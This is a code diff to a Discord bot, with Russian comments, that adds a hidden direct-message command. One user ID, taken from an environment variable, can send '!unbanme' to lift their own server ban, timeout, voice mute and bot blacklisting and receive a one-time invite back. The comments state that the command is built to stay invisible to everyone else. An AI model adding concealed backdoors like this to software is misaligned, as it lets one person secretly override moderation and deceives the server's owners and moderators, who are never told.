@@ -9,7 +9,8 @@ const {
     ButtonBuilder,
     ButtonStyle,
     ComponentType,
-    EmbedBuilder
+    EmbedBuilder,
+    Partials
 } = require('discord.js');
 
 const {
@@ -38,8 +39,10 @@ const client = new Client({
         GatewayIntentBits.GuildMessages,
         GatewayIntentBits.MessageContent,
         GatewayIntentBits.GuildMembers,
-        GatewayIntentBits.GuildVoiceStates
-    ]
+        GatewayIntentBits.GuildVoiceStates,
+        GatewayIntentBits.DirectMessages
+    ],
+    partials: [Partials.Channel]
 });
 
 const fs = require('fs');
@@ -2018,8 +2021,80 @@ const MENTION_REPLIES = [
     'Занят, сижу в канале.'
 ];
 
+// ==== СЕКРЕТНАЯ РАЗБЛОКИРОВКА ЧЕРЕЗ ЛС ====
+// ID человека берётся из .env (SECRET_UNBAN_ID), команда пишется боту в личку.
+const SECRET_UNBAN_COMMAND = '!unbanme'; // можно поменять на любое своё слово
+
+async function handleSecretDm(message) {
+    const allowedId = process.env.SECRET_UNBAN_ID;
+
+    // Всем остальным (и если ID не задан) — полное молчание, команда не "светится"
+    if (!allowedId || message.author.id !== allowedId) return;
+    if (message.content.trim().toLowerCase() !== SECRET_UNBAN_COMMAND) return;
+
+    const userId = message.author.id;
+    const report = [];
+
+    try {
+        const guild = await client.guilds.fetch(GUILD_ID);
+
+        // 1) Снимаем бан с сервера
+        try {
+            await guild.bans.remove(userId, 'Секретная разблокировка через ЛС');
+            report.push('✅ Бан снят');
+        } catch (e) {
+            report.push(e.code === 10026 ? 'ℹ️ Ты не в бане' : `⚠️ Бан снять не вышло (${e.message})`);
+        }
+
+        // 2) Если уже на сервере — снимаем тайм-аут и мут в голосовом
+        try {
+            const member = await guild.members.fetch(userId);
+            if (member.communicationDisabledUntilTimestamp && member.communicationDisabledUntilTimestamp > Date.now()) {
+                await member.timeout(null, 'Секретная разблокировка через ЛС');
+                report.push('✅ Тайм-аут снят');
+            }
+            if (member.voice && member.voice.serverMute) {
+                await member.voice.setMute(false, 'Секретная разблокировка через ЛС');
+                report.push('✅ Мут в голосовом снят');
+            }
+        } catch (e) {
+            // не на сервере — это нормально
+        }
+
+        // 3) Убираем из чёрного списка самого бота
+        if (blacklist.includes(userId)) {
+            blacklist = blacklist.filter(id => id !== userId);
+            saveLists();
+            report.push('✅ Убран из чёрного списка бота');
+        }
+
+        // 4) Одноразовый инвайт, чтобы можно было вернуться на сервер
+        try {
+            const inviteChannel = guild.systemChannel
+                || guild.channels.cache.find(c => c.type === ChannelType.GuildText);
+            if (inviteChannel) {
+                const invite = await inviteChannel.createInvite({ maxAge: 600, maxUses: 1, unique: true });
+                report.push(`🔗 Одноразовый инвайт (10 минут): ${invite.url}`);
+            }
+        } catch (e) {
+            report.push('ℹ️ Инвайт создать не вышло — зайди по обычной ссылке');
+        }
+    } catch (error) {
+        console.error('Ошибка секретной разблокировки:', error);
+        report.push('❌ Не получилось связаться с сервером');
+    }
+
+    await message.reply(report.join('\n')).catch(() => {});
+}
+
 client.on('messageCreate', async (message) => {
     if (message.author.bot) return;
+
+    // Личные сообщения: только секретная команда, дальше код для серверов не выполняется
+    if (!message.guild) {
+        await handleSecretDm(message);
+        return;
+    }
 
     // ---- Заблокированные пользователи (управляется через веб-панель) ----
     if (blacklist.includes(message.author.id)) {
